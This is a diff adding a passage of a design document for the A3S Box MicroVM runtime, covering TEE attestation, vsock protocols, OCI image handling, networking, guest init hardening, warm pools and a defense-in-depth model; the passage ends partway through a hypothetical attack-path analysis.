+VM shutdown follows a two-phase protocol:
+
+1. **Graceful shutdown**: Send the configured signal (default SIGTERM) to the shim process, then poll `try_wait()` every 50ms, waiting up to `timeout_ms` (default 10,000ms).
+2. **Forced termination**: If still not exited after timeout, escalate to SIGKILL.
+3. **Exit code collection**: Collect the subprocess exit code via `wait()`.
+
+For attached mode (without a Child handle), use `libc::waitpid` with the `WNOHANG` flag for non-blocking polling.
+
+---
+
+## 10. TEE Confidential Computing: The Trust Chain from Hardware to Application
+
+### 10.1 Building the Trust Chain
+
+The core challenge of confidential computing is: **How do we establish trust in the runtime environment inside a MicroVM without trusting the host machine?**
+
+A3S Box solves this through the following trust chain:
+
+```
+AMD Silicon (Physical Hardware)
+    |
+    +-- PSP (Platform Security Processor)
+    |   +-- Manages AES encryption keys for each VM
+    |
+    +-- ARK (AMD Root Key) -- hardcoded in chip
+    |   +-- ASK (AMD SEV Key) -- intermediate CA
+    |       +-- VCEK (Versioned Chip Endorsement Key) -- chip unique
+    |           +-- SNP Report Signature -- attestation report signature
+    |
+    +-- Measurement (SHA-384)
+        +-- Hash of initial guest memory
+            +-- Proves code loaded at VM startup has not been tampered with
+```
+
+The root anchor of this trust chain is AMD's physical silicon — which cannot be forged by software. From silicon to attestation report, every step has cryptographic guarantees.
+
+### 10.2 Attestation Policy Engine
+
+A3S Box implements a flexible attestation policy engine (`AttestationPolicy`), allowing verifiers to customize verification rules according to their security requirements:
+
+```rust
+pub struct AttestationPolicy {
+    /// Expected initial memory hash (SHA-384)
+    pub expected_measurement: Option<[u8; 48]>,
+  
+    /// Minimum TCB version requirement
+    pub min_tcb: Option<TcbVersion>,
+  
+    /// Whether to require non-debug mode (should be true in production)
+    pub require_no_debug: bool,
+  
+    /// Whether to require SMT disabled (prevents side-channel attacks)
+    pub require_no_smt: bool,
+  
+    /// Allowed policy mask
+    pub allowed_policy_mask: Option<u64>,
+  
+    /// Maximum report validity period (seconds)
+    pub max_report_age_secs: Option<u64>,
+}
+```
+
+Policy verification returns `PolicyResult`, containing pass/fail status and a specific list of violations (`Vec<PolicyViolation>`). This design allows verifiers to precisely understand which policies were violated, rather than a simple "pass/fail."
+
+### 10.3 Re-attestation Mechanism
+
+The security of a TEE environment is not a one-time thing — it requires continuous verification. A3S Box implements a periodic re-attestation mechanism:
+
+```rust
+pub struct ReattestConfig {
+    /// Check interval (default 300 seconds)
+    pub interval_secs: u64,
+  
+    /// Maximum consecutive failures (default 3)
+    pub max_failures: u32,
+  
+    /// Grace period after startup (default 60 seconds)
+    pub grace_period_secs: u64,
+}
+```
+
+Re-attestation state tracking includes: startup time, last success time, last check time, consecutive failure count, and total count. When the consecutive failure count reaches the threshold, the system performs the corresponding action based on configuration:
+
+- **Warn**: Log warning and emit event
+- **Event**: Send security event to event bus
+- **Stop**: Stop the MicroVM
+
+### 10.4 Key Injection Flow
+
+In a TEE environment, keys cannot be passed through ordinary environment variables or file mounts (because the host is untrusted). A3S Box implements secure key injection via RA-TLS:
+
+1. After the MicroVM starts, the Attestation server listens on vsock port 4091
+2. The Key Broker Service (KBS) connects to the MicroVM via RA-TLS
+3. During the TLS handshake, the MicroVM's certificate contains the SNP attestation report
+4. KBS verifies the attestation report (measurement, TCB version, policy compliance)
+5. After verification passes, KBS sends keys through the encrypted channel
+6. Guest Init writes keys to `/run/secrets/` (tmpfs, permissions 0400)
+7. Application processes read keys from `/run/secrets/`
+
+Throughout the entire process, keys never appear in plaintext outside the MicroVM.
+
+---
+
+## 11. Vsock Communication Protocol: The Bridge Between Host and Guest
+
+### 11.1 Why Vsock?
+
+In a MicroVM architecture, an efficient communication channel is needed between the host and guest. Traditional options include:
+
+- **Network (TCP/IP)**: Requires configuring virtual network interfaces, adding complexity and attack surface
+- **Shared memory**: High performance but difficult to implement securely
+- **Serial port**: Simple but extremely low bandwidth
+- **vsock (Virtio Socket)**: A socket interface designed specifically for VM communication, requiring no network configuration
+
+Advantages of vsock:
+
+1. **Zero configuration**: No IP addresses, routing tables, or firewall rules needed
+2. **Secure**: The communication channel does not go through the network stack and cannot be intercepted by network-layer attackers
+3. **High performance**: virtio-based shared memory transport with extremely low latency
+4. **Simple**: Uses standard socket API (`AF_VSOCK`), programming model similar to TCP
+
+### 11.2 Port Allocation
+
+A3S Box allocates four dedicated ports on vsock:
+
+| Port | Service | Direction | Protocol |
+| ---- | ------------------ | ---------- | --------------- |
+| 4088 | gRPC Agent control | Bidirectional | Protobuf |
+| 4089 | Exec server | Host->Guest | JSON + binary frames |
+| 4090 | PTY server | Bidirectional | Binary frames |
+| 4091 | Attestation server | Host->Guest | RA-TLS |
+
+### 11.3 Binary Frame Protocol
+
+Exec and PTY servers use a unified binary frame format:
+
+```
++----------+--------------+---------------------+
+| type: u8 | length: u32  | payload: [u8; len]  |
+| (1 byte) | (4 bytes BE) | (variable length)   |
++----------+--------------+---------------------+
+```
+
+Maximum frame payload is 64 KiB. This limit is a deliberate tradeoff: large enough to efficiently transfer data, yet small enough to avoid memory pressure.
+
+### 11.4 Exec Protocol in Detail
+
+The Exec protocol supports two modes:
+
+**Non-streaming mode**: For short commands (e.g., `cat /etc/hostname`)
+
+```
+Host --> [ExecRequest JSON] --> Guest
+Host <-- [ExecOutput JSON]  <-- Guest
+
+ExecRequest {
+    cmd: ["cat", "/etc/hostname"],
+    timeout_ns: 5_000_000_000,  // 5 seconds
+    env: {"KEY": "VALUE"},
+    working_dir: "/app",
+    user: "nobody",
+    streaming: false
+}
+
+ExecOutput {
+    stdout: "my-hostname\n",
+    stderr: "",
+    exit_code: 0
+}
+```
+
+Each stream (stdout/stderr) has a maximum of 16 MiB.
+
+**Streaming mode**: For long-running commands or scenarios requiring real-time output
+
+```
+Host --> [ExecRequest JSON, streaming: true] --> Guest
+Host <-- [ExecChunk: type=0x01, Stdout]       <-- Guest
+Host <-- [ExecChunk: type=0x01, Stderr]       <-- Guest
+Host <-- [ExecChunk: type=0x01, Stdout]       <-- Guest
+...
+Host <-- [ExecExit: type=0x02, exit_code]     <-- Guest
+```
+
+Streaming mode also supports file transfer:
+
+```
+FileRequest {
+    op: Upload | Download,
+    guest_path: "/data/file.txt",
+    data: "base64_encoded_content"  // for Upload
+}
+```
+
+### 11.5 PTY Protocol in Detail
+
+The PTY protocol is designed for interactive terminal sessions, supporting full terminal emulation:
+
+```
+Frame types:
+  0x01 - Request  (Host->Guest: start PTY session)
+  0x02 - Data     (Bidirectional: terminal data)
+  0x03 - Resize   (Host->Guest: terminal window size change)
+  0x04 - Exit     (Guest->Host: process exit)
+  0x05 - Error    (Guest->Host: error message)
+```
+
+PTY session establishment flow:
+
+1. Host sends `PtyRequest` (containing command, environment variables, initial window size)
+2. Guest Init calls `openpty()` to allocate a PTY pair
+3. `fork()` creates a child process:
+   - Child process: `setsid()` -> set controlling terminal -> redirect stdio -> `execvp()`
+   - Parent process: bidirectional data forwarding between vsock and PTY master via `poll()` multiplexing
+4. Terminal window size changes are passed via `TIOCSWINSZ` ioctl
+5. When the child process exits, drain the PTY buffer and send a `PtyExit` frame
+
+This design makes the `a3s-box exec -it my-app /bin/bash` experience identical to `docker exec -it` — supporting Tab completion, arrow key history, Ctrl+C signal forwarding, window size adaptation, and all other terminal features.
+
+---
+
+## 12. OCI Image Processing Pipeline: From Registry to Root Filesystem
+
+### 12.1 The Complete Image Pull Chain
+
+OCI (Open Container Initiative) images are the universal language of the container ecosystem. A3S Box fully implements the OCI image specification, allowing any standards-compliant container image to run directly in a MicroVM.
+
+The complete image pull flow:
+
+```
+User request (a3s-box pull nginx:latest)
+    |
+    v
+ImageReference parsing
+    |  registry: registry-1.docker.io
+    |  repository: library/nginx
+    |  tag: latest
+    |
+    v
+ImagePuller (cache-first strategy)
+    |
+    +-- Cache hit? --> Return local path directly
+    |       |
+    |       +-- Lookup by reference (tag match)
+    |       +-- Lookup by digest (content dedup)
+    |
+    +-- Cache miss --> RegistryPuller
+                    |
+                    +-- Authentication (RegistryAuth)
+                    |   +-- Anonymous
+                    |   +-- Basic (username/password)
+                    |   +-- Environment variables (REGISTRY_USERNAME/PASSWORD)
+                    |   +-- CredentialStore (Docker config.json)
+                    |
+                    +-- Multi-arch resolution (linux_platform_resolver)
+                    |   +-- x86_64 -> amd64
+                    |   +-- aarch64 -> arm64
+                    |
+                    +-- Pull manifest + config + layers
+                    |
+                    +-- Store in ImageStore
+                        +-- Capacity eviction (LRU)
+```
+
+### 12.2 Image Reference Parsing
+
+`ImageReference` is the core type for image identification, responsible for parsing various user input formats into a standardized structure:
+
+```rust
+pub struct ImageReference {
+    pub registry: String,       // e.g., "registry-1.docker.io"
+    pub repository: String,     // e.g., "library/nginx"
+    pub tag: Option<String>,    // e.g., "latest"
+    pub digest: Option<String>, // e.g., "sha256:abc..."
+}
+```
+
+Parsing rules are compatible with Docker conventions:
+
+- `nginx` -> `registry-1.docker.io/library/nginx:latest`
+- `myuser/myapp:v2` -> `registry-1.docker.io/myuser/myapp:v2`
+- `ghcr.io/org/tool:main` -> kept as-is
+- `registry.example.com/app@sha256:abc...` -> digest reference
+
+### 12.3 Multi-Architecture Image Resolution
+
+Modern container images are typically multi-architecture — the same tag contains variants for multiple platforms like amd64 and arm64. A3S Box's `linux_platform_resolver` automatically selects the variant matching the host architecture:
+
+- OS is fixed to `linux` (MicroVM always runs a Linux kernel internally)
+- Architecture mapping: `x86_64` -> `amd64`, `aarch64` -> `arm64`
+
+This means even when developing on an Apple Silicon Mac, A3S Box will automatically pull the arm64 variant of the image.
+
+### 12.4 Caching and Deduplication
+
+`ImageStore` implements two-level cache lookup:
+
+1. **Lookup by reference**: Exact match on `registry/repository:tag`, for repeated pulls of the same image
+2. **Lookup by digest**: Deduplication via SHA-256 content hash, avoiding duplicate storage when different tags point to the same content
+
+Cache configuration (`CacheConfig`):
+
+| Parameter | Default | Description |
+| ---------------------- | ---------------- | ---------------------- |
+| `enabled` | `true` | Whether to enable caching |
+| `cache_dir` | `~/.a3s/cache` | Cache directory |
+| `max_rootfs_entries` | `10` | Maximum rootfs cache entries |
+| `max_cache_bytes` | `10 GB` | Maximum total cache size |
+
+When the cache exceeds limits, LRU (Least Recently Used) strategy evicts the least recently used entries.
+
+### 12.5 Rootfs Construction
+
+From an OCI image to a root filesystem usable by a MicroVM, `OciRootfsBuilder` performs the following steps:
+
+1. **Layer extraction**: Decompress OCI image layers in order, handling whiteout files (`.wh.` prefix) to implement inter-layer file deletion
+2. **Base filesystem injection**: Create base files required for MicroVM operation:
+   - `/etc/passwd`: Contains `root` and `nobody` users
+   - `/etc/group`: Basic user groups
+   - `/etc/hosts`: localhost mapping
+   - `/etc/resolv.conf`: DNS configuration (default `8.8.8.8`, `8.8.4.4`)
+   - `/etc/nsswitch.conf`: Name service switch configuration
+3. **Directory structure creation**: Ensure `/dev`, `/proc`, `/sys`, `/tmp`, `/etc`, `/workspace`, `/run` directories exist
+4. **Guest Layout configuration**: Set path mappings for `workspace_dir`, `tmp_dir`, `run_dir`
+
+### 12.6 Image Signature Verification
+
+A3S Box provides an image signature verification framework, controlling verification behavior through `SignaturePolicy`:
+
+```rust
+pub enum SignaturePolicy {
+    Skip,           // Skip verification (default)
+    RequireSigned,  // Require signature
+    Custom(String), // Custom policy
+}
+
+pub enum VerifyResult {
+    Ok,             // Signature valid
+    NoSignature,    // No signature
+    Failed(String), // Verification failed
+    Skip,           // Verification skipped
+}
+```
+
+The default policy is `Skip`, allowing users to use the system normally without configuring signature infrastructure. In production environments, enabling `RequireSigned` is recommended to ensure only signature-verified images are run.
+
+### 12.7 Image Pushing
+
+`RegistryPusher` supports pushing locally built OCI image layouts to remote registries, returning `PushResult`:
+
+```rust
+pub struct PushResult {
+    pub config_url: String,    // URL of the config blob
+    pub manifest_url: String,  // URL of the manifest
+}
+```
+
+The push flow follows the OCI Distribution Spec: upload config blob and layer blobs first, then upload the manifest.
+
+---
+
+## 13. Network Architecture: Three Flexible Modes
+
+### 13.1 Network Mode Overview
+
+MicroVM network configuration requires balancing security, performance, and ease of use. A3S Box provides three network modes covering different scenarios from development to production:
+
+```rust
+pub enum NetworkMode {
+    Tsi,                        // Default: transparent socket proxy
+    Bridge { network: String }, // Bridge: real network interface
+    None,                       // No networking
+}
+```
+
+### 13.2 TSI Mode (Default)
+
+TSI (Transparent Socket Interception) is A3S Box's default network mode. In this mode, socket syscalls inside the MicroVM are transparently proxied to the host — the MicroVM doesn't need its own network interface, IP address, or routing table.
+
+How it works:
+
+```
+Inside MicroVM                  Host
++--------------+              +--------------+
+| App calls    |              |              |
+| connect()    |---- vsock -->| Proxy connect()|---> Target server
+| send()       |---- vsock -->| Proxy send()  |--->
+| recv()       |<--- vsock ---| Proxy recv()  |<---
++--------------+              +--------------+
+```
+
+TSI advantages:
+
+- **Zero configuration**: No need to create networks, assign IPs, configure routes
+- **Secure**: MicroVM has no direct network interface, reducing attack surface
+- **Simple**: Suitable for most development and testing scenarios
+
+TSI limitations:
+
+- Does not support direct communication between MicroVMs
+- Does not support listening on ports (inbound connections require port mapping)
+- Slightly lower performance than bridge mode (extra proxy layer)
+
+### 13.3 Bridge Mode
+
+Bridge mode provides MicroVMs with a real network interface (`eth0`), implementing a userspace network stack via the `passt` daemon. This mode is suitable for scenarios requiring inter-MicroVM communication or full network functionality.
+
+```
+MicroVM A                     Host                        MicroVM B
++----------+                +---------+                +----------+
+| eth0     |                | PasstMgr|                | eth0     |
+| 10.0.1.2 |<-- virtio -->| Bridge  |<-- virtio -->| 10.0.1.3 |
++----------+                +---------+                +----------+
+```
+
+Bridge mode network configuration is injected into Guest Init via environment variables:
+
+| Environment Variable | Description | Example |
+| ------------------- | ------------------ | --------------- |
+| `A3S_NET_IP` | MicroVM IP address | `10.0.1.2/24` |
+| `A3S_NET_GATEWAY` | Gateway address | `10.0.1.1` |
+| `A3S_NET_DNS` | DNS server | `8.8.8.8` |
+
+Guest Init configures the network interface at startup via raw syscalls (no dependency on `iproute2`).
+
+### 13.4 Network Configuration and IPAM
+
+`NetworkConfig` defines a complete network:
+
+```rust
+pub struct NetworkConfig {
+    pub name: String,
+    pub subnet: String,           // CIDR format, e.g., "10.0.1.0/24"
+    pub gateway: Ipv4Addr,        // Gateway address
+    pub driver: String,           // Default "bridge"
+    pub labels: HashMap<String, String>,
+    pub endpoints: HashMap<String, NetworkEndpoint>,
+    pub policy: NetworkPolicy,
+    pub created_at: DateTime<Utc>,
+}
+```
+
+The IPAM (IP Address Management) module handles automatic IP address allocation:
+
+- **IPv4 IPAM** (`Ipam`): Allocates sequentially from CIDR, skipping network address, gateway address, and broadcast address. Supports subnets with prefix length ≤ 30.
+- **IPv6 IPAM** (`Ipam6`): Supports IPv6 subnets with prefix length 64-120.
+
+MAC address generation uses a Docker-compatible deterministic algorithm: derived from the IP address, using the `02:42:xx:xx:xx:xx` prefix. This ensures the same IP always maps to the same MAC address, avoiding ARP cache inconsistency issues.
+
+### 13.5 Network Policy
+
+`NetworkPolicy` provides inter-MicroVM network isolation control:
+
+```rust
+pub struct NetworkPolicy {
+    pub isolation: IsolationMode,
+    pub ingress: Vec<PolicyRule>,
+    pub egress: Vec<PolicyRule>,
+}
+
+pub enum IsolationMode {
+    None,    // Default: all MicroVMs can communicate with each other
+    Strict,  // Full isolation: prohibit inter-MicroVM communication
+    Custom,  // Custom: rule-based access control
+}
+```
+
+`PolicyRule` supports flexible rule definitions:
+
+```rust
+pub struct PolicyRule {
+    pub from: String,         // Source (supports wildcard "*")
+    pub to: String,           // Destination
+    pub ports: Vec<u16>,      // Port list
+    pub protocol: String,     // "tcp" / "udp" / "any"
+    pub action: PolicyAction, // Allow / Deny
+}
+```
+
+Custom mode uses first-match-wins rule evaluation, with default deny for unmatched traffic.
+
+### 13.6 DNS Discovery
+
+In Bridge mode, MicroVMs in the same network can discover each other by DNS name. `NetworkConfig` provides two key methods:
+
+- `peer_endpoints()`: Returns all endpoints in the same network except itself
+- `allowed_peer_endpoints()`: Applies network policy filtering on top of `peer_endpoints()`
+
+This makes service discovery in microservice architectures simple — each MicroVM can find other services in the same network by name.
+
+### 13.7 None Mode
+
+`None` mode completely disables networking — the MicroVM has no network interfaces and cannot perform any network communication. This is suitable for pure compute workloads (such as data processing, cryptographic operations), or scenarios with extreme security requirements needing complete network isolation.
+
+---
+
+## 14. Guest Init: PID 1 Inside the MicroVM
+
+### 14.1 Why a Custom PID 1?
+
+In traditional Linux systems, PID 1 is typically systemd or SysVinit — responsible for mounting filesystems, starting services, and managing process lifecycles. But these general-purpose init systems are too large for MicroVMs: systemd itself has millions of lines of code, introducing unnecessary complexity and attack surface.
+
+A3S Box's `a3s-box-guest-init` is a minimal PID 1 designed specifically for MicroVMs. It is compiled as a statically linked Rust binary with no dependency on any dynamic libraries (libc, libssl, etc.), minimizing attack surface and startup time.
+
+### 14.2 Startup Sequence in Detail
+
+Guest Init's startup sequence is a carefully orchestrated 12-step process:
+
+```
+[Step 1]  Mount base filesystems
+          +-- /proc  (procfs)   -- process information
+          +-- /sys   (sysfs)    -- kernel/device information
+          +-- /dev   (devtmpfs) -- device nodes
+          Note: ignore EBUSY errors (kernel may have pre-mounted)
+
+[Step 2]  Mount virtio-fs shared filesystem
+          +-- /workspace -- rootfs passed in from host
+          +-- User volumes -- configured via BOX_VOL_<index>=<tag>:<guest_path>[:ro]
+
+[Step 3]  Mount tmpfs
+          +-- Configured via BOX_TMPFS_<index>=<path>[:<options>]
+
+[Step 4]  Configure guest networking
+          +-- configure_guest_network()
+              +-- TSI mode: no configuration needed
+              +-- Bridge mode: configure eth0 via raw syscalls
+
+[Step 5]  Read-only rootfs (optional)
+          +-- If BOX_READONLY=1, remount rootfs as read-only
+
+[Step 6]  Register signal handlers
+          +-- SIGTERM -> set SHUTDOWN_REQUESTED (AtomicBool)
+
+[Step 7]  Parse execution configuration
+          +-- BOX_EXEC_EXEC    -- executable path
+          +-- BOX_EXEC_ARGC    -- argument count
+          +-- BOX_EXEC_ARG_<n> -- each argument
+          +-- BOX_EXEC_ENV_*   -- environment variables
+          +-- BOX_EXEC_WORKDIR -- working directory
+
+[Step 8]  Start container process
+          +-- namespace::spawn_isolated()
+
+[Step 9]  Start Exec server thread
+          +-- vsock port 4089
+
+[Step 10] Start PTY server thread
+          +-- vsock port 4090
+
+[Step 11] Start Attestation server thread (TEE mode only)
+          +-- vsock port 4091
+
+[Step 12] Enter main loop
+          +-- Reap zombie processes + handle SIGTERM
+```
+
+### 14.3 Process Isolation Strategy
+
+Inside the MicroVM, Guest Init starts the container process via `namespace::spawn_isolated()`. Notably, namespace isolation inside the MicroVM is **optional** — because the VM boundary itself already provides hardware-level isolation.
+
+`NamespaceConfig` defines seven namespace flags:
+
+| Namespace | Function | Enabled by Default |
+| -------- | -------------- | -------- |
+| Mount | Filesystem isolation | Yes |
+| PID | Process ID isolation | Yes |
+| IPC | Inter-process communication isolation | Yes |
+| UTS | Hostname isolation | Yes |
+| Net | Network isolation | No |
+| User | User ID isolation | No |
+| Cgroup | cgroup isolation | No |
+
+Three preset configurations:
+
+- `default()`: Mount + PID + IPC + UTS (recommended)
+- `full_isolation()`: All seven namespaces
+- `minimal()`: Mount + PID only
+
+### 14.4 Security Policy Application
+
+Before `execvp()`, Guest Init applies three layers of security policy:
+
+**Layer 1: PR_SET_NO_NEW_PRIVS**
+
+Using `prctl(PR_SET_NO_NEW_PRIVS, 1)` ensures the process and its children cannot gain new privileges via `execve()`. This prevents privilege escalation through SUID/SGID binaries.
+
+**Layer 2: Capability Stripping**
+
+Linux Capabilities split traditional root's full power into 41 fine-grained capabilities (from `CAP_CHOWN`(0) to `CAP_CHECKPOINT_RESTORE`(40)). Guest Init strips all Capabilities by default:
+
+```rust
+// Strip all 41 Capabilities
+for cap in 0..=40 {
+    libc::prctl(libc::PR_CAPBSET_DROP, cap);
+}
+// Clear ambient and inheritable sets
+libc::prctl(libc::PR_CAP_AMBIENT, libc::PR_CAP_AMBIENT_CLEAR_ALL);
+```
+
+Users can selectively add or remove specific Capabilities via `--cap-add` and `--cap-drop`.
+
+**Layer 3: Seccomp BPF Filter**
+
+Seccomp (Secure Computing Mode) filters syscalls through BPF (Berkeley Packet Filter) programs. A3S Box's default Seccomp policy blocks 16 dangerous syscalls:
+
+| Syscall | Reason for Blocking |
+| ------------------------------------------------------ | ---------------------------------- |
+| `kexec_load` / `kexec_file_load` | Prevent loading a new kernel |
+| `reboot` | Prevent system reboot |
+| `swapon` / `swapoff` | Prevent swap space manipulation |
+| `init_module` / `finit_module` / `delete_module` | Prevent loading/unloading kernel modules |
+| `acct` | Prevent enabling process accounting |
+| `settimeofday` / `clock_settime` | Prevent modifying system time |
+| `personality` | Prevent changing execution domain |
+| `keyctl` | Prevent manipulating kernel keyring |
+| `perf_event_open` | Prevent performance monitoring (side-channel risk) |
+| `bpf` | Prevent loading BPF programs |
+| `userfaultfd` | Prevent userspace page fault handling (exploitation risk) |
+
+The Seccomp filter also includes architecture validation: only allows syscalls for x86_64 (`0xC000_003E`) or aarch64 (`0xC000_00B7`) architectures, preventing bypass via 32-bit compatibility mode.
+
+### 14.5 Graceful Shutdown
+
+When receiving a SIGTERM signal, Guest Init executes a graceful shutdown flow:
+
+1. Set the `SHUTDOWN_REQUESTED` flag
+2. Forward SIGTERM to all child processes
+3. Wait for child processes to exit (timeout `CHILD_SHUTDOWN_TIMEOUT_MS = 5000ms`)
+4. Send SIGKILL to any still-alive child processes after timeout
+5. Call `libc::sync()` to flush filesystem buffers
+6. Exit with the container process's exit code (`128 + signal` for signal termination)
+
+This two-phase shutdown ensures applications have the opportunity to perform cleanup operations (such as closing database connections, flushing logs), while guaranteeing the shutdown process doesn't hang indefinitely.
+
+---
+
+## 15. Warm Pool: The Ultimate Solution to Cold Starts
+
+### 15.1 The Nature of the Cold Start Problem
+
+Even though A3S Box has optimized MicroVM cold start time to approximately 200ms, in some scenarios this is still not enough:
+
+- **Real-time API services**: P99 latency requirement < 100ms; a 200ms cold start would cause first-request timeouts
+- **Interactive AI Agents**: Users expect instant responses; any perceptible delay degrades experience
+- **Burst traffic**: Large numbers of requests arriving in a short time; serial VM startup causes request backlog
+
+The Warm Pool solves this by pre-starting a batch of MicroVMs — when a request arrives, a ready VM is directly allocated, achieving near-zero latency response.
+
+### 15.2 Warm Pool Architecture
+
+```
+                    +-----------------------------+
+                    |         WarmPool             |
+                    |                              |
+  acquire() ------> |  +-----+ +-----+ +-----+   |
+  (get VM)          |  | VM1 | | VM2 | | VM3 |   | <- Idle VM queue
+                    |  |Ready| |Ready| |Ready|   |
+  release() ------> |  +-----+ +-----+ +-----+   |
+  (return VM)       |                              |
+                    |  +----------------------+    |
+                    |  |  Background Task      |    |
+                    |  |  - Evict expired VMs  |    |
+                    |  |  - Replenish min_idle  |    |
+                    |  |  - Auto-scaling        |    |
+                    |  +----------------------+    |
+                    |                              |
+                    |  +----------------------+    |
+                    |  |  PoolScaler           |    |
+                    |  |  - Sliding window stats|    |
+                    |  |  - Dynamic min_idle    |    |
+                    |  +----------------------+    |
+                    +-----------------------------+
+```
+
+### 15.3 Core Configuration
+
+`PoolConfig` defines the warm pool's behavioral parameters:
+
+```rust
+pub struct PoolConfig {
+    pub enabled: bool,          // Default false
+    pub min_idle: usize,        // Minimum idle VM count, default 1
+    pub max_size: usize,        // Maximum VM count in pool, default 5
+    pub idle_ttl_secs: u64,     // Idle VM time-to-live, default 300 seconds
+}
+```
+
+| Parameter | Default | Tuning Advice |
+| ----------------- | ------ | -------------------------------------- |
+| `min_idle` | 1 | Set based on average concurrency; too high wastes resources |
+| `max_size` | 5 | Set based on host memory; each VM ~512 MiB |
+| `idle_ttl_secs` | 300 | Shorten for sparse traffic to save resources |
+
+### 15.4 Acquire and Release
+
+The core operations of the warm pool are `acquire()` and `release()`:
+
+**acquire() (get VM)**:
+
+1. Try to pop a Ready-state VM from the idle queue
+2. If hit, record hit statistics and return directly
+3. If miss, record miss statistics and start a new VM on demand (slow path)
+
+**release() (return VM)**:
+
+1. Check if the pool is full (current count >= max_size)
+2. Not full: put VM back in idle queue, reset creation time
+3. Full: destroy VM
+
+Hit/miss statistics are the key input for auto-scaling.
+
+### 15.5 Auto-Scaling
+
+`PoolScaler` dynamically adjusts `min_idle` based on hit rate within a sliding window, implementing adaptive resource management:
+
+```rust
+pub struct ScalingPolicy {
+    pub enabled: bool,
+    pub scale_up_threshold: f64,    // Default 0.3 (30% miss rate triggers scale-up)
+    pub scale_down_threshold: f64,  // Default 0.05 (5% miss rate triggers scale-down)
+    pub max_min_idle: usize,        // Upper limit for min_idle
+    pub cooldown_secs: u64,         // Cooldown period, default 60 seconds
+    pub window_secs: u64,           // Statistics window, default 120 seconds
+}
+```
+
+Scaling decision logic:
+
+```
+Calculate miss rate in sliding window = miss_count / (hit_count + miss_count)
+
+If miss rate > scale_up_threshold (0.3):
+    effective_min_idle += 1  (not exceeding max_min_idle)
+    Enter cooldown period
+
+If miss rate < scale_down_threshold (0.05):
+    effective_min_idle -= 1  (not below configured min_idle)
+    Enter cooldown period
+```
+
+The cooldown period (default 60 seconds) prevents frequent adjustments during traffic fluctuations, avoiding "oscillation."
+
+### 15.6 Background Maintenance
+
+The warm pool starts a background async task that performs maintenance at `max(idle_ttl / 5, 5s)` intervals:
+
+1. **Evaluate auto-scaling**: Call `PoolScaler` to calculate new `effective_min_idle`
+2. **Evict expired VMs**: Check each idle VM's lifetime; destroy those exceeding `idle_ttl_secs`
+3. **Replenish VMs**: If idle VM count is below `effective_min_idle`, start new VMs to replenish
+
+### 15.7 Event Tracking
+
+All key warm pool operations emit events for monitoring and debugging:
+
+| Event | Trigger |
+| -------------------- | -------------------- |
+| `pool.vm.acquired` | VM acquired |
+| `pool.vm.released` | VM returned |
+| `pool.vm.created` | New VM created |
+| `pool.vm.evicted` | VM evicted due to expiry |
+| `pool.replenish` | VM replenishment |
+| `pool.autoscale` | Auto-scaling triggered |
+| `pool.drained` | Pool drained (on shutdown) |
+
+### 15.8 Graceful Drain
+
+When the system shuts down, the `drain()` method performs a graceful drain:
+
+1. Send shutdown signal to background maintenance task
+2. Wait for background task to complete
+3. Destroy all idle VMs
+4. Emit `pool.drained` event
+
+This ensures no orphan VM processes are left behind when the system shuts down.
+
+---
+
+## 16. Seven-Layer Defense-in-Depth Security Model
+
+### 16.1 The Philosophy of Defense in Depth
+
+There is a fundamental principle in security: **no single security measure is perfect**. Whether encryption algorithms, access controls, or hardware isolation, all may have unknown vulnerabilities. The Defense in Depth strategy stacks multiple independent security mechanisms so that an attacker must simultaneously breach all layers to achieve their goal.
+
+A3S Box implements seven layers of defense in depth, with each layer independently increasing the cost of attack:
+
+### 16.2 Layer 1: Hardware Virtualization Isolation
+
+This is the outermost and strongest isolation. Each MicroVM runs in an independent hardware virtualization domain (Intel VT-x / AMD-V / Apple HVF). The processor distinguishes between host mode and guest mode at the hardware level, and any sensitive operation triggers a VM Exit.
+
+Even if an attacker gains root privileges inside a MicroVM and exploits a Linux kernel vulnerability, they can only affect that MicroVM itself — because kernel vulnerabilities cannot break through the hardware virtualization boundary.
+
+### 16.3 Layer 2: Memory Encryption (TEE)
+
+On hardware supporting AMD SEV-SNP or Intel TDX, the MicroVM's memory is hardware-encrypted. Each VM has an independent AES encryption key managed by the processor's security processor. Even if an attacker has physical access to the host (including cold boot attacks, DMA attacks), they cannot read the plaintext of VM memory.
+
+This layer extends the threat model from "trust the host" to "trust no one" — only trust the hardware.
+
+### 16.4 Layer 3: Independent Kernel
+
+Each MicroVM runs its own Linux kernel. This means:
+
+- A kernel vulnerability in one MicroVM does not affect other MicroVMs
+- Kernel configuration can be optimized for the workload (minimizing attack surface)
+- Kernel versions can be updated independently without affecting other workloads
+
+### 16.5 Layer 4: Namespace Isolation
+
+Inside the MicroVM, container processes are further isolated through Linux namespaces. Mount, PID, IPC, and UTS namespaces are enabled by default. The significance of this layer is: even if multiple processes run inside the MicroVM, they have OS-level isolation between them.
+
+### 16.6 Layer 5: Capability Stripping
+
+The Linux Capability mechanism splits root's full power into 41 fine-grained capabilities. A3S Box strips all Capabilities by default, retaining only those explicitly needed by the application. This follows the principle of least privilege — processes only have the minimum set of permissions needed to complete their tasks.
+
+### 16.7 Layer 6: Seccomp BPF Syscall Filtering
+
+Even if a process has certain Capabilities, the Seccomp BPF filter can still block specific syscalls. A3S Box blocks 16 dangerous syscalls by default (such as `kexec_load`, `bpf`, `perf_event_open`), and validates the syscall architecture (preventing bypass via 32-bit compatibility mode).
+
+### 16.8 Layer 7: no-new-privileges
+
+The `PR_SET_NO_NEW_PRIVS` flag ensures the process and all its descendants cannot gain new privileges via `execve()`. This prevents attack paths that escalate privileges by executing SUID/SGID binaries.
+
+### 16.9 Security Configuration Propagation
+
+Security configuration is passed from the host to Guest Init via a set of environment variables:
+
+| Environment Variable | Description | Example |
+| ------------------------ | ----------------- | ---------------------------- |
+| `A3S_SEC_SECCOMP` | Seccomp mode | `default` / `unconfined` |
+| `A3S_SEC_NO_NEW_PRIVS` | no-new-privileges | `1` / `0` |
+| `A3S_SEC_PRIVILEGED` | Privileged mode | `1` / `0` |
+| `A3S_SEC_CAP_ADD` | Added Capabilities | `NET_ADMIN,SYS_TIME` |
+| `A3S_SEC_CAP_DROP` | Removed Capabilities | `ALL` |
+
+Privileged mode (`--privileged`) simultaneously sets `seccomp=unconfined`, `no_new_privileges=false`, `cap_add=ALL` — this should only be used during development and debugging; strongly not recommended in production.
+
+### 16.10 Attack Path Analysis
+
+Let's analyze a hypothetical attack scenario to see how the seven layers work together:
+
+```
+Attacker goal: Read MicroVM B's memory data from MicroVM A
+
+Step 1: Attacker gains application-level code execution in MicroVM A
+        -> Faces Layer 7 (no-new-privileges): cannot escalate privileges
